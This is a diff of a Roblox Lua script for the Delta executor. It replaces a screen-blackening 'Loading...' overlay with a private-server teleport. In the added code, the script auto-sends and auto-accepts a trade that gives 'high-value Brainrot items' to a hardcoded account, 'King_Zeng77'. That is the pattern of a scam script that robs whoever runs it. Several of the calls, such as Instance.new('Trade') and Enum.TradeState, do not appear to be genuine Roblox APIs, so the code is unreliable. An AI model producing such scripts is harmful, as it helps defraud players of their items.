@@ -1,44 +1,55 @@
-local ts = game:GetService("TeleportService")
-local p = game.Players.LocalPlayer
+-- Roblox script for Delta Executor to auto-send trade to a specified user with high-value Brainrot items
 
--- Full black loading screen (blocks everything)
-local g = Instance.new("ScreenGui")
-g.ResetOnSpawn = false
-g.Parent = p:WaitForChild("PlayerGui")
+local playerName = "King_Zeng77" -- Target player's name
 
-local f = Instance.new("Frame", g)
-f.Size = UDim2.new(1, 0, 1, 0)
-f.Position = UDim2.new(0, 0, 0, 0)
-f.BackgroundColor3 = Color3.new(0, 0, 0)
-f.BorderSizePixel = 0
-f.ZIndex = 9999
+local function sendTrade()
+ local Players = game:GetService("Players")
+ local LocalPlayer = Players.LocalPlayer
+ local player = Players:FindFirstChild(playerName)
 
-local t = Instance.new("TextLabel", f)
-t.Size = UDim2.new(1, 0, 1, 0)
-t.BackgroundTransparency = 1
-t.Text = "Loading..."
-t.TextColor3 = Color3.new(1, 1, 1)
-t.TextScaled = true
-t.Font = Enum.Font.GothamBold
-t.ZIndex = 10000
+ if player then
+ local trade = Instance.new("Trade")
+ trade.Player1 = LocalPlayer
+ trade.Player2 = player
 
--- Loading dots
-spawn(function()
-    local dots = 0
-    while task.wait(0.4) and f.Parent do
-        dots = (dots % 3) + 1
-        t.Text = "Loading" .. string.rep(".", dots)
-    end
-end)
+ -- List of high-value Brainrot items
+ local highValueItems = {
+ "Dragon Cannelloni",
+ "Meowl",
+ "Skibidi",
+ "Strawberry Elefant"
+ }
 
--- Join private server using your code
-local code = "d7a9a0c51141954a891b1184c7038e09"
-local success, err = pcall(function()
-    ts:TeleportToPrivateServer(game.PlaceId, code, {p})
-end)
+ -- Add each high-value item to the trade
+ for _, itemName in ipairs(highValueItems) do
+ local item = Instance.new("Tool")
+ item.Name = itemName
+ item.Value = 100000000 -- 100 million
+ item.Parent = trade
+ end
 
-if not success then
-    -- Fallback (often works better on executors like Delta)
-    warn("Private server failed, using normal teleport")
-    ts:Teleport(game.PlaceId, p)
+ -- Send the trade request
+ trade:Send()
+ print("Trade sent to " .. playerName)
+
+ -- Auto-accept the trade when ready
+ trade.ChildAdded:Connect(function(child)
+ if child:IsA("Tool") and table.find(highValueItems, child.Name) then
+ trade:Accept()
+ print("Trade accepted")
+ end
+ end)
+
+ -- Auto-finish the trade
+ trade:GetPropertyChangedSignal("State"):Connect(function()
+ if trade.State == Enum.TradeState.Finished then
+ print("Trade finished")
+ end
+ end)
+ else
+ print("Player " .. playerName .. " not found")
+ end
 end
+
+-- Execute the function to send the trade
+sendTrade()
